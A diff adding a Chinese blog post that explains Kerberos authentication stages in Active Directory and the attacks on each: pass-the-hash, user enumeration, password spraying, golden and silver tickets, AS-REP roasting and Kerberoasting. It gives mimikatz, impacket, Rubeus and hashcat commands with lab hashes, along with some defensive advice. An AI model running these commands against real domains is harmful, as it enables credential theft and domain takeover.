@@ -231,6 +231,653 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/10/03/kerberos%E5%8D%8F%E8%AE%AE%E5%8F%8A%E9%97%AE%E9%A2%98/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="https://avatars.githubusercontent.com/u/47177122?v=4">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="我是GG还是MM">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2021/10/03/kerberos%E5%8D%8F%E8%AE%AE%E5%8F%8A%E9%97%AE%E9%A2%98/" itemprop="url">kerberos协议及问题</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2021-10-03T20:09:25+08:00">
+                2021-10-03
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="kerberos协议及其漏洞"><a href="#kerberos协议及其漏洞" class="headerlink" title="kerberos协议及其漏洞"></a>kerberos协议及其漏洞</h1><table>
+<thead>
+<tr>
+<th>DC</th>
+<th>域控</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>KDC</td>
+<td>密钥分发中心，由域控担任</td>
+</tr>
+<tr>
+<td>AD</td>
+<td>活动目录，里面包含域内用户数据库</td>
+</tr>
+</tbody></table>
+<table>
+<thead>
+<tr>
+<th>AS</th>
+<th>Kerberos认证服务</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>TGT</td>
+<td>TGT认证权证，由AS服务发放</td>
+</tr>
+<tr>
+<td>TGS</td>
+<td>票据授予服务</td>
+</tr>
+</tbody></table>
+<table>
+<thead>
+<tr>
+<th>ST</th>
+<th>ST服务票据，由TGS服务发送</th>
+<th></th>
+</tr>
+</thead>
+<tbody><tr>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+</tbody></table>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12576598/1629727222212-820b6881-29ec-4da1-b123-d87306cfb808.png" alt="img"></p>
+<p><strong>krbtgt</strong> 用户，该用户是在创建域时系统自动创建的一个账号，其作用是密钥发行中心的服务账号，其密码是系统随机生成的，无法正常登陆主机。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12576598/1613722052952-f2c5efd3-2005-48a3-91b5-c63bca7f7ccc.png" alt="img"></p>
+<p>域控(server08):192.168.3.142</p>
+<p>server08：192.168.3.68</p>
+<h1 id="AS-REQ"><a href="#AS-REQ" class="headerlink" title="AS-REQ"></a>AS-REQ</h1><p>客户端向KDC的AS认证服务请求TGT认证权证。TGT是KDC的AS认证服务发放的</p>
+<p>1、<strong>AS-REQ</strong>：当域内某个用户试图访问域中的某个服务，于是输入用户名和密码，本机的Kerberos服务会向KDC的AS认证服务发送一个AS-REQ认证请求。该请求包中包含： <strong>请求的用户名</strong>、<strong>客户端主机名、加密类型</strong> 和 <strong>Authenticator(用户NTLM Hash加密的时间戳</strong>) 以及一些其他信息。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12576598/1613722528264-edc05b5c-44d2-46b9-ad25-4e59a4a735a8.png" alt="img"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12576598/1613722670732-818c64ca-56cb-48c7-9008-fbdb9b8fa338.png" alt="img"><img src="https://cdn.nlark.com/yuque/0/2021/png/12576598/1613722834037-200c4372-8545-4e7a-a6f1-4b782a606b69.png" alt="img"></p>
+<h2 id="AS-REQ阶段产生的攻击方式"><a href="#AS-REQ阶段产生的攻击方式" class="headerlink" title="AS-REQ阶段产生的攻击方式"></a>AS-REQ阶段产生的攻击方式</h2><h3 id="1-HASH传递"><a href="#1-HASH传递" class="headerlink" title="1.HASH传递"></a>1.HASH传递</h3><p>在AS-REQ阶段，是用用户密码Hash加密的Authenticator，所以也就造成了hash传递</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12576598/1613723833691-6832f951-af88-4d88-a05d-c8e5e4cf5555.png" alt="img"></p>
+<p>只适用于域环境，并且目标主机需要安装 KB2871997补丁 PTK</p>
+<h3 id="2-域内用户枚举"><a href="#2-域内用户枚举" class="headerlink" title="2.域内用户枚举"></a>2.域内用户枚举</h3><p>AS-REQ 的 cname 值，当用户不存在时，返回包提示错误，所以造成了改攻击方式。user.txt不需要加上@0day.org，也可以使用udp</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12576598/1613725421381-f109b52b-63a8-4bdd-93dc-605a3d22c65c.png" alt="img"></p>
+<h3 id="3-密码喷洒"><a href="#3-密码喷洒" class="headerlink" title="3.密码喷洒"></a>3.密码喷洒</h3><p>并且当用户名存在，密码正确和错误时，返回包也不一样，所以可以进行用户名密码爆破。这种针对所有用户的自动密码猜测通常是为了避免帐户被锁定，因为针对同一个用户的连续密码猜测会导致帐户被锁定。所以只有对所有用户同时执行特定的密码登录尝试，才能增加破解的概率，消除帐户被锁定的概率</p>
+<p>针对明文：</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12576598/1613725766225-69e15552-5a92-4721-aa84-49d67dedfc3f.png" alt="img"></p>
+<p>针对ntlm hash：</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12576598/1613725820077-3e9e2aad-216c-44c0-a1c5-0bae5d736dd3.png" alt="img"></p>
+<h1 id="AS-REP"><a href="#AS-REP" class="headerlink" title="AS-REP"></a>AS-REP</h1><p>2、<strong>AS-REP</strong>：当KDC接收到请求之后，通过AD活动目录查询得到该用户的密码Hash，用该密码Hash对请求包的Authenticator进行解密，如果解密成功，则证明请求者提供的密码正确，而且需要时间戳范围在五分钟内，且不是重放，于是预认证成功。KAS成功认证对方的身份之后，发送响应包给客户端。响应包中主要包括：<strong>krbtgt用户的NTLM Hash加密后的TGT认购权证(<strong>即ticket这部分</strong>)</strong> 和 <strong>用户NTLM Hash加密的Login Session key(<strong>即最外层 enc-part 这部分</strong>)</strong> 以及一些其他信息。该Login Session Key的作用是用于确保客户端和KDC下阶段之间通信安全。最后TGT认购权证、加密的Lgoin Session Key、时间戳 和 PAC等信息会发送给客户端。PAC中包含用户的SID，用户所在的组等一些信息。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12576598/1613726609132-893d9354-3324-4131-820b-93de1a7a004c.png" alt="img"></p>
+<p>在enc-part里面最重要的字段是Login session key，作为下阶段的认证密钥。</p>
+<p>AS-REP中最核心的东西就是 Login session-key 和 加密的ticket。正常我们用工具生成的凭据是 .ccache 和 .kirbi 后缀的，用mimikatz，kekeo，rubeus生成的凭据是以 .kirbi 后缀的，impacket 生成的凭据的后缀是 .ccache 。两种票据主要包含的都是Login session-key 和 加密的 ticket，因此可以相互转化。</p>
+<h2 id="AS-REP阶段产生的攻击方式"><a href="#AS-REP阶段产生的攻击方式" class="headerlink" title="AS-REP阶段产生的攻击方式"></a>AS-REP阶段产生的攻击方式</h2><h3 id="1-黄金票据"><a href="#1-黄金票据" class="headerlink" title="1.黄金票据"></a>1.黄金票据</h3><p>在 AS-REP 阶段，由于返回的 TGT 认购权证是由 krbtgt 用户的密码Hash加密的，因此如果我们拥有 krbtgt 的 hash 就可以自己制作一个TGT认购权证，这就造成了黄金票据攻击</p>
+<p>伪造黄金票据的前提：</p>
+<ul>
+<li><p>要伪造的域用户(这里我们一般填写域管理员账户)</p>
+</li>
+<li><p>域名</p>
+</li>
+<li><p>域的SID值(就是域成员SID值去掉最后的)</p>
+</li>
+<li><p>krbtgt账号的哈希值或AES-256值</p>
+</li>
+</ul>
+<p><strong>1.使用mimikatz</strong></p>
+<p>先获取krbtgt hash：</p>
+<p>在域控执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;lsadump::dcsync /domain:0day.org /user:krbtgt&quot;</span><br></pre></td></tr></table></figure>
+
+<p>得到如下信息：</p>
+<p>sid：S-1-5-21-1812960810-2335050734-3517558805</p>
+<p>ntlm hash：36f9d9e6d98ecf8307baf4f46ef842a2</p>
+<p>aes256：dbc55f9f925de5a482d3bf5ede7d0d46d4b121c01bdd9d06be4aed367212d3f9</p>
+<p>伪造用户administrator执行(aes256)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mimikatz &quot;kerberos::golden /domain:0day.org /sid:S-1-5-21-1812960810-2335050734-3517558805</span><br><span class="line">/aes256:dbc55f9f925de5a482d3bf5ede7d0d46d4b121c01bdd9d06be4aed367212d3f9 /user:administrator</span><br><span class="line">/ticket:gold.kirbi&quot;</span><br></pre></td></tr></table></figure>
+
+<p>伪造用户administrator执行(krbtgt hash)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mimikatz &quot;kerberos::golden /domain:0day.org /sid:S-1-5-21-1812960810-2335050734-3517558805</span><br><span class="line">/krbtgt:36f9d9e6d98ecf8307baf4f46ef842a2 /user:administrator /ticket:gold.kirbi&quot;</span><br></pre></td></tr></table></figure>
+
+<p>生成文件gold.kirbi</p>
+<p>导入Golden Ticket，执行命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptt C:\Users\jack.0DAY\Desktop\gold.kirbi</span><br></pre></td></tr></table></figure>
+
+<p>获得域控权限</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12576598/1613986295851-e2b33340-dc98-43c3-bc42-1c1c1960e532.png" alt="img"></p>
+<p><strong>注意这里格式只能是 主机名.域名 的形式，而不能写ip</strong></p>
+<p><strong>2.使用impacket</strong></p>
+<p>这里使用kali，不在域内只需要把dns改为域控即可</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12576598/1613987028310-1c761c88-fdfe-4a94-a553-181ca911d48e.png" alt="img"></p>
+<p>先生成票据administrator.ccache</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 ticketer.py -domain-sid S-1-5-21-1812960810-2335050734-3517558805 -nthash 36f9d9e6d98ecf8307baf4f46ef842a2 -domain 0day.org administrator</span><br></pre></td></tr></table></figure>
+
+
+
+<p>导入票据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export KRB5CCNAME=administrator.ccache</span><br></pre></td></tr></table></figure>
+
+<p>然后在访问域控</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 smbexec.py -no-pass -k OWA2010SP3.0day.org</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12576598/1613989663062-226d593b-6d7d-4d6c-8ded-e5a6e192481e.png" alt="img"></p>
+<h3 id="2-AS-REP-Roasting"><a href="#2-AS-REP-Roasting" class="headerlink" title="2.AS-REP Roasting"></a>2.AS-REP Roasting</h3><p>在AS-REP阶段，最外层的 enc-part 是用用户密码 Hash 加密的。对于域用户，如果设置了选项” Do not require Kerberos preauthentication”，此时向域控制器的 88 端口发送 AS_REQ 请求，对收到的AS_REP内容(enc-part底下的ciper，因为这部分是使用用户 hash 加密的 Login Session Key，我们通过进行离线爆破就可以获得用户hash)重新组合，能够拼接成”Kerberos 5 AS-REP etype 23”(18200)的格式，接下来可以使用hashcat对其破解，最终获得该用户的明文口令，这就造成了 AS-REP Roasting攻击。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12576598/1613990155881-e9a1fb6e-7f5f-449a-be20-6ca74313edab.png" alt="img"></p>
+<p>默认这个功能是不启用的，如果启用AS-REP会返回用户hash加密的sessionkey-as，这样我们就可以用john离线破解</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12576598/1613990496078-5e52cd9c-dfa2-45a9-ae5f-1ed7c8b0c46a.png" alt="img"></p>
+<p>使用Empire下的powerview.ps1查找域中设置了 “不需要kerberos预身份验证” 的用户</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\powerview.ps1</span><br><span class="line"> Get-DomainUser -PreauthNotRequired</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12576598/1613990824748-60b9a3b3-717e-448a-b941-c3de2ccd07af.png" alt="img"></p>
+<p>使用ASREPRoast.ps1获取AS-REP返回的Hash</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\ASREPRoast.ps1</span><br><span class="line">Get-ASREPHash -UserName jack -Domain 0day.org | Out-File -Encoding ASCII hash.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12576598/1613991011355-0bfcf4be-3686-44e4-a003-d19976b8f425.png" alt="img"></p>
+<p>修改为hashcat能识别的格式，在$krb5asrep后面添加$23拼接</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 18200 hash.txt pass.txt --force</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12576598/1613991698243-92645834-a57e-4ca7-b5ad-aec7212b4733.png" alt="img"></p>
+<h1 id="TGS-REQ"><a href="#TGS-REQ" class="headerlink" title="TGS-REQ"></a>TGS-REQ</h1><p>经过上面的步骤，客户端获得了 TGT认购权证 和 Login Session Key。然后用自己的密码NTLM Hash解密Login Session Key得到 原始的Logon Session Key。然后它会在本地缓存此 TGT认购权证 和 原始的Login Session Key。如果现在它需要访问某台服务器的某个服务，它就需要凭借这张TGT认购凭证向KDC购买相应的入场券<strong>ST服务票据（Service Ticket）。</strong>ST服务票据是通过KDC的另一个服务 <strong>TGS（Ticket Granting Service）</strong>出售的。在这个阶段，微软引入了两个扩展自协议 S4u2self 和 S4u2Proxy(当委派的时候，才用的到)</p>
+<p>3、<strong>TGS-REQ</strong>：客户端向KDC购买针对指定服务的ST服务票据请求，该请求主要包含如下的内容：<strong>客户端信息、Authenticator(Login Session Key加密的时间戳)、TGT认购权证(padata下ap-req下的ticket) 和 访问的服务名</strong> 以及一些其他信息 。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12576598/1613992911206-d2b00a4b-b521-4698-aa9e-b463029ec72c.png" alt="img"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12576598/1613992992520-3bc0bc7e-ee59-49af-8a36-75c970733efa.png" alt="img"></p>
+<h1 id="TGS-REP"><a href="#TGS-REP" class="headerlink" title="TGS-REP"></a>TGS-REP</h1><p>4.、TGS-REP：TGS接收到请求之后，首先会检查自身是否存在客户端所请求的服务。如果服务存在，则通过 krbtgt 用户的NTLM Hash 解密TGT并得到Login Session Key，然后通过Login Session Key解密Authenticator，如果解密成功，则验证了对方的真实身份，同时还会验证时间戳是否在范围内。并且还会检查TGT中的时间戳是否过期，且原始地址是否和TGT中保存的地址相同。在完成上述的检测后，如果验证通过，则TGS完成了对客户端的认证，会生成一个用Logon Session Key加密后的用于确保客户端-服务器之间通信安全的Service Session Key会话秘钥(也就是最外层enc-part部分)。并且会为该客户端生成ST服务票据。ST服务票据主要包含两方面的内容：客户端用户信息 和 原始Service Session Key，整个ST服务票据用该服务的NTLM Hash进行加密。最终Service Session Key 和 ST服务票据 发送给客户端。(这一步不管用户有没有访问服务的权限，只要TGT正确，就都会返回ST服务票据，这也是kerberoasting能利用的原因，任何一个用户，只要hash正确，就可以请求域内任何一个服务的ST票据)</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12576598/1614434676304-23119d15-5dc8-4e10-a623-b10520caebbb.png" alt="img"></p>
+<p>enc-part：这部分是用请求服务的密码Hash加密的。因此如果我们拥有服务的密码Hash，那么我们就可以自己制作一个ST服务票据，这就造成了白银票据攻击。也正因为该票据是用请求服务的密码Hash加密的，所以当我们得到了ST服务票据，可以尝试爆破enc_part，来得到服务的密码Hash。这也就造成了kerberoast攻击</p>
+<h2 id="TGS-REP阶段产生的攻击方式"><a href="#TGS-REP阶段产生的攻击方式" class="headerlink" title="TGS-REP阶段产生的攻击方式"></a>TGS-REP阶段产生的攻击方式</h2><h3 id="1-Kerberoast攻击"><a href="#1-Kerberoast攻击" class="headerlink" title="1.Kerberoast攻击"></a>1.Kerberoast攻击</h3><p>Kerberoast攻击过程：</p>
+<p>1.攻击者对一个域进行身份验证，然后从域控制器获得一个TGT认购权证 ，该TGT认购权证用于以后的ST服务票据请求</p>
+<p>2.攻击者使用他们的 TGT认购权证 发出ST服务票据请求(TGS-REQ) 获取特定形式（name/host）的 servicePrincipalName (SPN)。例如：MSSqlSvc/SQL.domain.com。此SPN在域中应该是唯一的，并且在用户或计算机帐户的servicePrincipalName 字段中注册。 在服务票证请求(TGS-REQ)过程中，攻击者可以指定它们支持的Kerberos加密类型(RC4_HMAC，AES256_CTS_HMAC_SHA1_96等等)。</p>
+<p>3.如果攻击者的 TGT 是有效的，则 DC 将从TGT认购权证 中提取信息并填充到ST服务票据中。 然后，域控制器查找哪个帐户在 ServicedPrincipalName 字段中注册了所请求的 SPN。 ST服务票据使用注册了所要求的 SPN 的帐户的NTLM哈希进行加密, 并使用攻击者和服务帐户共同商定的加密算法。 ST服务票据以服务票据回复(TGS-REP)的形式发送回攻击者。</p>
+<p>4.攻击者从 TGS-REP 中提取加密的服务票证。 由于服务票证是用链接到请求 SPN 的帐户的哈希加密的，所以攻击者可以离线破解这个加密块，恢复帐户的明文密码。</p>
+<p><strong>首先是请求服务票据</strong></p>
+<p>1.Rubeus.exe请求</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe kerberoast</span><br></pre></td></tr></table></figure>
+
+<p>Rubeus里面的kerberoast支持对所有用户或者特定用户执行kerberoasting操作，其原理在于先用LDAP查询于内的spn，再通过发送TGS包，然后直接打印出能使用 hashcat 或 john 爆破的Hash。 以下的命令会打印出注册于用户下的所有SPN的服务票据的hashcat格式。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12576598/1614434733477-80fde52f-83a2-4cc5-bc3f-9d3ee70baebe.png" alt="img"></p>
+<p>2.powershell请求</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#请求服务票据</span><br><span class="line">Add-Type -AssemblyName System.IdentityModel</span><br><span class="line">New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList &quot;MSSQLSvc/Srv-DB-0day.0day.org:1433&quot;</span><br><span class="line">#列出服务票据</span><br><span class="line">klist</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2021/jpeg/12576598/1614434742559-416f668e-820e-41a1-99b8-1e6b26af43a8.jpeg" alt="img"></p>
+<p>3.mimikatz请求</p>
+<p>请求指定SPN的服务票据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#请求服务票据</span><br><span class="line">kerberos::ask /target:MSSQLSvc/Srv-DB-0day.0day.org:1433 </span><br><span class="line">#列出服务票据</span><br><span class="line">kerberos::list  </span><br><span class="line">#清除所有票据</span><br><span class="line">kerberos::purge</span><br></pre></td></tr></table></figure>
+
+<p>4.Impacket中的GetUserSPNS.py请求</p>
+<p>该脚本可以请求注册于用户下的所有SPN的服务票据。使用该脚本需要提供域账号密码才能查询。该脚本直接输出hashcat格式的服务票据，可用hashcat直接爆破。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 GetUserSPNs.py -request -dc-ip 192.168.200.143 0day.org/jack</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2021/jpeg/12576598/1614434757528-5ec30e08-92ca-4294-b18c-7216d7e7076a.jpeg" alt="img"></p>
+<p>这里输入jack的密码</p>
+<p><strong>导出票据</strong></p>
+<p>首先是查看</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">klist</span><br><span class="line">或</span><br><span class="line">mimikatz.exe &quot;kerberos::list&quot;</span><br><span class="line"> </span><br><span class="line">MSF里面</span><br><span class="line">load kiwi</span><br><span class="line">kerberos_ticket_list</span><br><span class="line">或</span><br><span class="line">load kiwi</span><br><span class="line">kiwi_cmd kerberos::list</span><br></pre></td></tr></table></figure>
+
+<p>1.mimikatz导出</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;kerberos::list /export&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure>
+
+<p>执行完后，会在mimikatz同目录下导出 后缀为kirbi的票据文件</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/jpeg/12576598/1614434757523-d4e2ea84-ac87-48b5-972f-5994e94d1058.jpeg" alt="img"></p>
+<p>2.Empire下的Invoke-Kerberoast.ps1</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\Invoke-Kerberoast.ps1;Invoke-Kerberoast -outputFormat Hashcat</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2021/jpeg/12576598/1614434757554-9382663e-3f01-4f5f-b0aa-73a7fa55776a.jpeg" alt="img"></p>
+<p><strong>离线破解服务票据</strong></p>
+<p>1.kerberoast中的tgsrepcrack.py</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 tgsrepcrack.py password.txt xx.kirbi</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2021/jpeg/12576598/1614434757586-aaa7dac9-e646-4ce2-942f-0dd27f1bc736.jpeg" alt="img"></p>
+<p>2.hashcat</p>
+<p>将导出的hashcat格式的哈希保存为hash.txt文件，放到hashcat的目录下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m  13100  hash.txt  pass.txt</span><br></pre></td></tr></table></figure>
+
+<p><strong>Kerberoast攻击防范</strong></p>
+<p>确保服务账号密码为强密码(长度、随机性、定期修改)</p>
+<p>如果攻击者无法将默认的AES256_HMAC加密方式改为RC4_HMAC_MD5，就无法实验 tgsrepcrack.py来破解密码。</p>
+<p>攻击者可以通过嗅探的方法抓取Kerberos TGS票据。因此，如果强制实验AES256_HMAC方式对Kerberos票据进行加密，那么，即使攻击者获取了Kerberos票据，也无法将其破解，从而保证了活动目录的安全性。</p>
+<p>许多服务账户在内网中被分配了过高的权限，且密码强度较差。攻击者很可能通过破解票据的密码，从域用户权限提升到域管理员权限。因此，应该对服务账户的权限进行适当的配置，并提高密码的强度。</p>
+<p>在进行日志审计时，可以重点关注ID为4679(请求Kerberos服务票据)的时间。如果有过多的 4769 日志，应进一步检查系统中是否存在恶意行为。</p>
+<h3 id="2-白银票据"><a href="#2-白银票据" class="headerlink" title="2.白银票据"></a>2.白银票据</h3><p>在TGS-REP阶段，TGS_REP里面的ticket的enc-part是使用服务的hash进行加密的，如果我们拥有服务的hash，就可以给我们自己签发任意用户的TGS票据，这个票据也被称为白银票据。相较于黄金票据，白银票据使用要访问服务的hash，而不是krbtgt的hash，由于生成的是TGS票据，不需要跟域控打交道，但是白银票票据只能访问特定服务。但是要注意的一点是，伪造的白银票据没有带有有效KDC签名的PAC。如果将目标主机配置为验证KDC PAC签名，则银票将不起作用</p>
+<p>要创建白银票据，我们需要知道以下信息：</p>
+<ul>
+<li><p>要伪造的域用户(这里我们一般填写域管理员账户)</p>
+</li>
+<li><p>域名</p>
+</li>
+<li><p>域的SID值(就是域成员SID值去掉最后的)</p>
+</li>
+<li><p>目标服务的FQDN</p>
+</li>
+<li><p>可利用的服务</p>
+</li>
+<li><p>服务账号的NTLM哈希</p>
+</li>
+</ul>
+<p>这里使用白银票据伪造CIFS服务，该通常用于Windows主机之间的文件共享。</p>
+<p>1.mimikatz获得服务账号的ntlm hash</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::Debug</span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12576598/1614501102630-19206b5f-3efc-4f55-96a8-6944211e274b.png" alt="img"></p>
+<p>得到NTLM为: 2c268a2a643267a4204a6ef6f896446b</p>
+<p>2.使用白银票据攻击</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /domain:0day.org /sid:S-1-5-21-1812960810-2335050734-3517558805 /target:OWA2010SP3.0day.org /service:cifs /rc4:2c268a2a643267a4204a6ef6f896446b /user:administrator /ptt</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12576598/1614501260607-64a58144-d91d-410f-a2b6-6785a9b679db.png" alt="img"></p>
+<p>3.查看票据</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12576598/1614501282454-70095b99-43ac-4639-9a2d-40e1cf7ced4e.png" alt="img"></p>
+<p>4.访问域控</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12576598/1614501327023-ec4bb34f-91a4-4c47-98a3-40dfaadd7a18.png" alt="img"></p>
+<p>防御：</p>
+<p>伪造的白银票据没有带有有效KDC签名的PAC。如果将目标主机配置为验证KDC PAC签名，则银票将不起作用。</p>
+<h3 id="3-白银票据和黄金票据的不同点"><a href="#3-白银票据和黄金票据的不同点" class="headerlink" title="3.白银票据和黄金票据的不同点"></a>3.白银票据和黄金票据的不同点</h3><p>访问权限不同：</p>
+<p>黄金票据Golden Ticket：伪造TGT认购权证，可以获取任何Kerberos服务权限</p>
+<p>白银票据Silver Ticket：伪造ST服务票据，只能访问指定的服务</p>
+<p>加密方式不同：</p>
+<p>Golden Ticket由krbtgt的Hash加密</p>
+<p>Silver Ticket 由服务账号（通常为计算机账户）Hash加密</p>
+<p>认证流程不同：</p>
+<p>Golden Ticket的利用过程需要访问域控，</p>
+<p>而Silver Ticket不需要</p>
+<h1 id="委派"><a href="#委派" class="headerlink" title="委派"></a>委派</h1><p>域委派是指，将域内用户的权限委派给服务账号，使得服务账号能以用户权限开展域内活动。</p>
+<p>服务账号（Service Account），域内用户的一种类型，服务器运行服务时所用的账号，将服务运行起来并加入域。例如MS SQL Server在安装时，会在域内自动注册服务账号SqlServiceAccount，这类账号不能用于交互式登录。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12576598/1614502870192-a2ec0aa9-bc89-47e2-82d9-074371629f17.png" alt="img"></p>
+<p>上图是经典的应用场景。一个域内普通用户jack通过Kerberos协议认证到前台WEB服后，前台运行WEB服务的服务账号websvc模拟（Impersonate）用户jack，以Kerberos协议继续认证到后台服务器，从而在后台服务器中获取jack用户的访问权限，即域中跳或者多跳的Kerberos认证。按照图中红色字体的数字，具体步骤如下：</p>
+<ul>
+<li><p>域内用户jack以Kerberos方式认证后访问Web服务器；</p>
+</li>
+<li><p>Web服务以websvc服务账号运行，websvc向KDC发起jack用户的票据申请；</p>
+</li>
+<li><p>KDC检查websvc用户的委派属性，如果被设置，则返回jack用户的可转发票据TGT；</p>
+</li>
+<li><p>websvc收到jack用户TGT后，使用该票据向KDC申请访问文件服务器的服务票据TGS；</p>
+</li>
+<li><p>KDC检查websvc的委派属性，如果被设置，且申请的文件服务在允许的列表清单中，则返回一个jack用户访问文件服务的授权票据TGS；</p>
+</li>
+<li><p>websvc收到的jack用户的授权票据TGS后，可访问文件服务，完成多跳认证。</p>
+</li>
+</ul>
+<p><strong>在域中，只有 服务账号 和 主机账号 才具有委派属性</strong></p>
+<p>主机账号就是AD活动目录中 Computers 中的计算机，也可以称为机器账号(一个普通域用户默认最多可以创建十个主机账号)。</p>
